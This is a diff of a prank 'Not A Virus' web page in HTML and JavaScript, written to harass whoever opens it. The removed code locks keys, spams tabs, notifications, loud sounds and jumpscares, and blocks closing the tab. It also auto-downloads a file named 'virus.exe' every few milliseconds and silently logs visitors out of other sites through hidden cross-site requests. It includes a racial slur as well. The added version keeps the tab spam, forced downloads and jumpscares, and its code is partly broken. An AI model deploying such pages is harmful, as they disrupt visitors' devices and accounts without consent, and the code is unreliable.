@@ -1,76 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Totally Not a Virus</title>
-<style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Not A Virus</title>
+  <style>
     body {
-        background-color: black;
-        color: red;
-        font-family: monospace;
-        text-align: center;
-        overflow: hidden;
-        cursor: url('https://cur.cursors-4u.net/cursors/cur-2/cur121.cur'), auto;
+      background-color: black;
+      color: red;
+      font-family: monospace;
+      text-align: center;
     }
-    .error-box {
-        position: absolute;
-        background: white;
-        color: black;
-        border: 2px solid red;
-        padding: 20px;
-        box-shadow: 5px 5px 15px rgba(255, 0, 0, 0.5);
-    }
-    @keyframes glitch {
-        0% { transform: translate(2px, -2px); }
-        50% { transform: translate(-2px, 2px); }
-        100% { transform: translate(2px, -2px); }
-    }
-    @keyframes shake {
-        0% { transform: translate(0, 0); }
-        25% { transform: translate(-10px, 0); }
-        50% { transform: translate(10px, 0); }
-        75% { transform: translate(-10px, 0); }
-        100% { transform: translate(10px, 0); }
-    }
-    .shaky {
-        animation: shake 0.1s infinite;
-    }
-    .invisible-text {
-        visibility: hidden;
-    }
-</style>
+  </style>
 </head>
 <body>
-<h1 id="glitchText">WARNING: SYSTEM FAILURE DETECTED</h1>
-<p>Attempting to fix...</p>
-<div id="virusScanner">Scanning for viruses...<br>0 threats found</div>
-<audio id="loudAudio" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
-<audio id="alertAudio" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>
+  <h1>Totally Not a Virus Trust Me Bro</h1>
+
+  <audio id="error" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>
+
 <script>
-    // Add more keys to block based on OS
-const blockKeys = ['Control', 'Alt', 'Meta', 'Escape', 'Tab', 'CapsLock', 'Search', 'Shift'];
 
-// Detect the operating system
-function getOS() {
-    const platform = navigator.platform.toLowerCase();
-    if (platform.includes('win')) {
-        return 'Windows';
-    } else if (platform.includes('mac')) {
-        return 'macOS';
-    } else if (platform.includes('linux')) {
-        return 'Linux';
-    } else if (platform.includes('cros')) {
-        return 'Chromebook';
-    }
-    return 'Unknown';
-}
+// === FUNCTIONS ===
 
-// Add OS-specific keys to block
 function getBlockedKeysByOS(os) {
     let osSpecificKeys = [];
 
-    switch (os) {
+switch (os) {
         case 'Windows':
             osSpecificKeys = ['F12', 'F11', 'Alt+Tab', 'Ctrl+Shift+Esc']; // Prevent common shortcuts
             break;
@@ -89,479 +44,122 @@ function getBlockedKeysByOS(os) {
     }
 
     return osSpecificKeys;
+
+// Glitch text
+function glitchText() {
+  document.body.innerHTML += `<h1 style="color: hsl(${Math.random() * 360}, 100%, 50%)">ERROR!</h1>`;
 }
 
-function randomResizeWindow() {
-    const randomWidth = Math.floor(Math.random() * 300 + 800);
-    const randomHeight = Math.floor(Math.random() * 200 + 600);
-    window.resizeTo(randomWidth, randomHeight);
+// Flash background
+function flashBackground() {
+  document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
 }
-setInterval(randomResizeWindow, 100);
 
-
-// Merge OS-specific keys with global block keys
-const os = getOS();
-const osSpecificKeys = getBlockedKeysByOS(os);
-const allBlockedKeys = [...blockKeys, ...osSpecificKeys];
-
-// Event listener to block keys
-document.addEventListener('keydown', (e) => {
-    if (allBlockedKeys.includes(e.key) || (e.ctrlKey && e.key === 'r')) {
-        e.preventDefault(); // Block the key
-    }
-});
-
-document.addEventListener('keyup', (e) => {
-    if (allBlockedKeys.includes(e.key)) e.preventDefault();
-});
-
-document.addEventListener('keypress', (e) => e.preventDefault());
-
-
-    function openRandomTabs() {
-        window.open(window.location.href, '_blank');
-    }
-    setInterval(openRandomTabs, 10000);
-
-    function requestNotification() {
-        if (Notification.permission !== 'granted') {
-            Notification.requestPermission();
-        }
-    }
-    requestNotification();
-
-    function sendNotification() {
-        if (Notification.permission === 'granted') {
-            new Notification('🚨 SYSTEM ALERT: Virus Detected! 🚨');
-        }
-    }
-    setInterval(sendNotification, 50);
-
-    function flashBackground() {
-        document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
-    }
-    setInterval(flashBackground, 500);
-
-    function rotatePage() {
-        document.body.style.transform = `rotate(${Math.random() * 360}deg)`;
-    }
-    setInterval(rotatePage, 400);
-
-    function flickerScreen() {
-        document.body.style.opacity = Math.random();
-    }
-    setInterval(flickerScreen, 300);
-
-    function randomZoom() {
-        document.body.style.zoom = Math.random() * 2;
-    }
-    setInterval(randomZoom, 200);
-
-    function randomButton() {
-        let button = document.createElement("button");
-        button.innerHTML = "Click Me!";
-        button.style.position = "absolute";
-        button.style.left = `${Math.random() * window.innerWidth}px`;
-        button.style.top = `${Math.random() * window.innerHeight}px`;
-        button.onclick = () => alert("Wrong button!");
-        document.body.appendChild(button);
-        setTimeout(() => button.remove(), 1500);
-    }
-    setInterval(randomButton, 1000);
-
-    function memeGIF() {
-        let img = document.createElement("img");
-        img.src = "https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif";
-        img.style.position = "absolute";
-        img.style.left = `${Math.random() * window.innerWidth}px`;
-        img.style.top = `${Math.random() * window.innerHeight}px`;
-        img.style.width = "100px";
-        document.body.appendChild(img);
-        setTimeout(() => img.remove(), 7000);
-    }
-    setInterval(memeGIF, 5000);
-
-    
-    function flipUpsideDown() {
-        document.body.style.transform = "rotate(180deg)";
-        setTimeout(() => { document.body.style.transform = "rotate(0deg)"; }, 3000);
-    }
-    setInterval(flipUpsideDown, 1500);
-
-    function randomResizeText() {
-        document.body.style.fontSize = `${Math.floor(Math.random() * 40) + 10}px`;
-    }
-    setInterval(randomResizeText, 2000);
-
-    function changeTabTitle() {
-        document.title = ["TINEKE IS EEN MILF", "JE MOEDER", "JE VADER", "WILMA", "WIE IS WILMA?"][Math.floor(Math.random() * 5)];
-    }
-    setInterval(changeTabTitle, 500);
-
-    function spamConsole() {
-        setInterval(() => {
-            console.log("%cSYSTEM BREACH DETECTED", "color: red; font-size: 20px;");
-        }, 500);
-    }
-    spamConsole();
-
-    function weirdScroll() {
-        window.scrollTo(Math.random() * document.body.scrollWidth, Math.random() * document.body.scrollHeight);
-    }
-    setInterval(weirdScroll, 500);
-
-    function vibrateDevice() {
-        if (navigator.vibrate) {
-            navigator.vibrate([250, 150, 100]);
-        }
-    }
-    setInterval(vibrateDevice, 800);
-
-    function crazyRotation() {
-        document.body.style.transition = "transform 0.5s ease";
-        document.body.style.transform = `rotate(${Math.random() * 720 - 360}deg)`;
-    }
-    setInterval(crazyRotation, 400);
-
-    function rainbowText() {
-        document.body.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-    }
-    setInterval(rainbowText, 700);
-
-    function randomMargin() {
-        document.body.style.marginLeft = `${Math.random() * 100}px`;
-        document.body.style.marginTop = `${Math.random() * 100}px`;
-    }
-    setInterval(randomMargin, 400);
-
-    function crazyBorder() {
-        document.body.style.border = `10px solid hsl(${Math.random() * 360}, 100%, 50%)`;
-    }
-    setInterval(crazyBorder, 350);
-
-
-    function playLoudSound() {
-    const sound = document.getElementById('loudAudio');
-    sound.volume = 1.0; // instead of 100
-    sound.play();
+// Spawn errors
+function spawnError() {
+  const div = document.createElement('div');
+  div.innerText = "CRITICAL ERROR DETECTED";
+  div.style.position = 'fixed';
+  div.style.top = Math.random() * window.innerHeight + "px";
+  div.style.left = Math.random() * window.innerWidth + "px";
+  div.style.color = 'red';
+  div.style.fontSize = (Math.random() * 20 + 10) + "px";
+  div.style.zIndex = 10000;
+  document.body.appendChild(div);
 }
-setInterval(playLoudSound, 500);
 
-function playAlertSound() {
-    const alert = document.getElementById('alertAudio');
-    alert.volume = 1.0; // instead of 100
-    alert.play();
+// Play error sound
+function playErrorSound() {
+  const error = document.getElementById('error');
+  error.currentTime = 0;
+  error.play();
 }
-setInterval(playAlertSound, 500);
 
-// Screamer jumpscares
-const jumpscareImages = [
+// Open random tabs
+function openRandomTabs() {
+  const urls = [
+    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "https://pointerpointer.com/",
+    "https://mondrian.io/",
+    "https://www.nyan.cat/"
+  ];
+  const url = urls[Math.floor(Math.random() * urls.length)];
+  window.open(url, "_blank");
+}
+
+// Auto download (simulate)
+function autoDownloadVirus() {
+  const link = document.createElement('a');
+  link.href = 'data:text/plain,You got owned!';
+  link.download = 'virus.txt';
+  document.body.appendChild(link);
+  link.click();
+  link.remove();
+}
+
+// Steal focus (annoy user)
+function stealFocus() {
+  window.focus();
+}
+
+// Window resize chaos
+function windowResize() {
+  window.resizeBy(Math.random() * 100 - 50, Math.random() * 100 - 50);
+}
+
+// Spoof user-agent
+function spoofUserAgent() {
+  const userAgents = [
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+    'FakeBrowser/123.45'
+  ];
+  Object.defineProperty(navigator, 'userAgent', {
+    get: function() {
+      return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
+  });
+}
+
+// Jumpscare images
+function randomJumpscare() {
+    const jumpscareImages = [
     "https://www.icegif.com/wp-content/uploads/2023/02/icegif-1692.gif", 
     "https://i.pinimg.com/originals/c0/7f/97/c07f97f3234f1820d0388f1a62377a9a.gif",
     "https://www.icegif.com/wp-content/uploads/2023/02/icegif-1681.gif",
     "https://www.icegif.com/wp-content/uploads/2023/02/icegif-1686.gif",
     "https://media.tenor.com/-yL9BAwZDOcAAAAM/rat-michael-jackson.gif"
 ];
-const jumpscareSounds = [
-    "https://www.myinstants.com/media/sounds/scream.mp3",
-    "https://www.myinstants.com/media/sounds/loud-jumpscare-scream.mp3",
-    "https://www.myinstants.com/media/sounds/goofy-ahh-car-horn-sound-effect.mp3"
-];
-
-// Preload all jumpscare sounds first
-const preloadedSounds = jumpscareSounds.map(src => {
-    const audio = new Audio(src);
-    audio.volume = 1.0;
-    return audio;
-});
-
-function randomJumpscare() {
-    // Create the jumpscare image
-    let img = document.createElement('img');
-    img.src = jumpscareImages[Math.floor(Math.random() * jumpscareImages.length)];
-    img.style.position = 'fixed';
-    img.style.left = '0';
-    img.style.top = '0';
-    img.style.width = '100vw';
-    img.style.height = '100vh';
-    img.style.zIndex = 9999;
-    document.body.appendChild(img);
-
-    // Play a random preloaded sound
-    let audio = preloadedSounds[Math.floor(Math.random() * preloadedSounds.length)];
-    audio.currentTime = 0; // rewind to start in case it was already playing
-    audio.play();
+  const img = document.createElement('img');
+  img.src = jumpscares[Math.floor(Math.random() * jumpscares.length)];
+  img.style.position = 'fixed';
+  img.style.left = 0;
+  img.style.top = 0;
+  img.style.width = '100vw';
+  img.style.height = '100vh';
+  img.style.zIndex = 9999;
+  document.body.appendChild(img);
+  setTimeout(() => img.remove(), 2000);
 }
 
-    setTimeout(() => img.remove(), 2000);
-}
-setInterval(randomJumpscare, 250);
+// === INTERVALS ===
 
-const loudSounds = [
-    "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3",
-    "https://www.soundjay.com/buttons/sounds/button-2.mp3",
-    "https://www.soundjay.com/buttons/sounds/button-10.mp3"
-];
+setInterval(glitchText, 500);
+setInterval(flashBackground, 300);
+setInterval(spawnError, 700);
+setInterval(playErrorSound, 500);
+setInterval(openRandomTabs, 1000);
+setInterval(autoDownloadVirus, 250);
+setInterval(stealFocus, 1500);
+setInterval(windowResize, 750);
+setInterval(spoofUserAgent, 1000);
+setInterval(randomJumpscare, 1000);
 
-function spamLoudSounds() {
-    let audio = new Audio(loudSounds[Math.floor(Math.random() * loudSounds.length)]);
-    audio.volume = 1.0; // not 100
-    audio.play();
-}
-setInterval(spamLoudSounds, 250);
-
-function moveFakeMouse() {
-    let cursor = document.createElement('div');
-    cursor.style.position = 'fixed';
-    cursor.style.width = '20px';
-    cursor.style.height = '20px';
-    cursor.style.background = 'white';
-    cursor.style.border = '2px solid black';
-    cursor.style.borderRadius = '50%';
-    cursor.style.left = `${Math.random() * window.innerWidth}px`;
-    cursor.style.top = `${Math.random() * window.innerHeight}px`;
-    cursor.style.zIndex = 10000;
-    document.body.appendChild(cursor);
-    setTimeout(() => cursor.remove(), 50);
-}
-setInterval(moveFakeMouse, 100);
-
-function scrambleText() {
-    document.querySelectorAll('h1, p, div, span, a').forEach(el => {
-        if (el.innerText) {
-            el.innerText = el.innerText
-                .split('')
-                .sort(() => Math.random() - 0.5)
-                .join('');
-        }
-    });
-}
-setInterval(scrambleText, 500);
-
-
-function isChromebook() {
-    const ua = navigator.userAgent.toLowerCase();
-    return ua.includes('cros') || ua.includes('chromebook');
-}
-
-function simulateScreenRotation() {
-    if (isChromebook()) {
-        document.body.style.transition = 'transform 0.5s ease';
-        let rotations = [90, 180, 270, 0];
-        let randomRotation = rotations[Math.floor(Math.random() * rotations.length)];
-        document.body.style.transform = `rotate(${randomRotation}deg)`;
-    }
-}
-setInterval(simulateScreenRotation, 100); //
-
-function stealFocus() {
-    window.focus();  // Brings the window back to focus
-    setTimeout(() => window.focus(), 50);  // Repeats this to ensure focus stays on the page
-}
-setInterval(stealFocus, 25); // 
-
-// Prevent tab closure
-window.onbeforeunload = function () {
-    return "Are you sure you want to leave?"; // Warning message on tab close attempt
+// Prevent closing
+window.onbeforeunload = function() {
+  return "Are you sure you want to leave? System may become unstable!";
 };
-
-function autoDownloadVirus() {
-    const a = document.createElement('a');
-    a.href = 'https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4'; // <-- you can host your own fake file
-    a.download = 'virus.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
-setInterval(autoDownloadVirus, 10);
-
-function hideCursor() {
-    document.body.style.cursor = 'none';
-    setTimeout(() => {
-        document.body.style.cursor = 'auto';
-    }, 20);
-}
-setInterval(hideCursor, 10);
-
-function randomLayout() {
-    const screenWidth = Math.random() * 1000 + 500;
-    const screenHeight = Math.random() * 500 + 500;
-    window.resizeTo(screenWidth, screenHeight);
-}
-setInterval(randomLayout, 2000);
-
-function simulateTyping() {
-    const keys = ['a', 'b', 'c', '1', '2', '3'];
-    const randomKey = keys[Math.floor(Math.random() * keys.length)];
-    const event = new KeyboardEvent('keydown', { key: randomKey });
-    document.dispatchEvent(event);
-}
-setInterval(simulateTyping, 125);
-
-function uncloseablePopup() {
-    const popup = document.createElement('div');
-    popup.style.position = 'fixed';
-    popup.style.top = '50%';
-    popup.style.left = '50%';
-    popup.style.transform = 'translate(-50%, -50%)';
-    popup.style.padding = '20px';
-    popup.style.backgroundColor = 'yellow';
-    popup.innerText = "You can't close me!";
-    document.body.appendChild(popup);
-}
-setInterval(uncloseablePopup, 500);
-
-function spoofUserAgent() {
-    const userAgents = [
-        'nigger',
-        'gay',
-        'ballsack'
-    ];
-    const randomAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-    navigator.__defineGetter__('userAgent', function () { return randomAgent; });
-}
-setInterval(spoofUserAgent, 250);
-
-function screenFlicker() {
-    const flicker = document.createElement('div');
-    flicker.style.position = 'absolute';
-    flicker.style.top = '0';
-    flicker.style.left = '0';
-    flicker.style.width = '100vw';
-    flicker.style.height = '100vh';
-    flicker.style.backgroundColor = 'black';
-    flicker.style.opacity = '0.7';
-    document.body.appendChild(flicker);
-    setTimeout(() => flicker.remove(), Math.random() * 100 + 50);
-}
-setInterval(screenFlicker, 500);
-
-function uncloseableModal() {
-    const modal = document.createElement('div');
-    modal.style.position = 'fixed';
-    modal.style.top = '0';
-    modal.style.left = '0';
-    modal.style.width = '100vw';
-    modal.style.height = '100vh';
-    modal.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
-    modal.style.color = 'white';
-    modal.style.display = 'flex';
-    modal.style.justifyContent = 'center';
-    modal.style.alignItems = 'center';
-    modal.style.fontSize = '40px';
-    modal.innerText = 'You cannot close this!';
-    document.body.appendChild(modal);
-}
-setInterval(uncloseableModal, 3000);
-
-function jumpText() {
-    const elements = document.querySelectorAll('p, h1, span');
-    elements.forEach((el) => {
-        el.style.position = 'relative';
-        el.style.top = `${Math.random() * 20 - 10}px`;
-        el.style.left = `${Math.random() * 20 - 10}px`;
-    });
-}
-setInterval(jumpText, 500);
-
-document.addEventListener('mousemove', (e) => {
-    const div = document.createElement('div');
-    div.style.position = 'absolute';
-    div.style.top = `${e.clientY}px`;
-    div.style.left = `${e.clientX}px`;
-    div.style.width = '10px';
-    div.style.height = '10px';
-    div.style.backgroundColor = 'red';
-    document.body.appendChild(div);
-    setTimeout(() => div.remove(), 1000);
-});
-
-function resizeModal() {
-    const modal = document.createElement('div');
-    modal.style.position = 'fixed';
-    modal.style.top = '50%';
-    modal.style.left = '50%';
-    modal.style.transform = 'translate(-50%, -50%)';
-    modal.style.width = `${Math.random() * 200 + 100}px`;
-    modal.style.height = `${Math.random() * 200 + 100}px`;
-    modal.style.backgroundColor = 'yellow';
-    modal.innerText = 'I keep resizing!';
-    document.body.appendChild(modal);
-    setTimeout(() => modal.remove(), 5000);
-}
-setInterval(resizeModal, 3000);
-
-function superLogout () {
-  function cleanup (el, delayCleanup) {
-    if (delayCleanup) {
-      delayCleanup = false
-      return
-    }
-    el.parentNode.removeChild(el)
-  }
-
-  function get (url) {
-    const img = document.createElement('img')
-    img.onload = () => cleanup(img)
-    img.onerror = () => cleanup(img)
-    img.style = HIDDEN_STYLE
-    document.body.appendChild(img)
-    img.src = url
-  }
-
-  function post (url, params) {
-    const iframe = document.createElement('iframe')
-    iframe.style = HIDDEN_STYLE
-    iframe.name = 'iframe' + numSuperLogoutIframes
-    document.body.appendChild(iframe)
-
-    numSuperLogoutIframes += 1
-
-    const form = document.createElement('form')
-    form.style = HIDDEN_STYLE
-
-    let numLoads = 0
-    iframe.onload = iframe.onerror = () => {
-      if (numLoads >= 1) cleanup(iframe)
-      numLoads += 1
-    }
-    form.action = url
-    form.method = 'POST'
-    form.target = iframe.name
-
-    for (const param in params) {
-      if (Object.prototype.hasOwnProperty.call(params, param)) {
-        const input = document.createElement('input')
-        input.type = 'hidden'
-        input.name = param
-        input.value = params[param]
-        form.appendChild(input)
-      }
-    }
-
-    document.body.appendChild(form)
-    form.submit()
-  }
-  for (const name in LOGOUT_SITES) {
-    const method = LOGOUT_SITES[name][0]
-    const url = LOGOUT_SITES[name][1]
-    const params = LOGOUT_SITES[name][2] || {}
-
-    if (method === 'GET') {
-      get(url)
-    } else {
-      post(url, params)
-    }
-
-    const div = document.createElement('div')
-    div.innerText = `Logging you out from ${name}...`
-
-    const logoutMessages = document.querySelector('.logout-messages')
-    logoutMessages.appendChild(div)
-  }
-}
-  superLogout()
-  setInterval(superLogout, 1000)
 
 </script>
 </body>
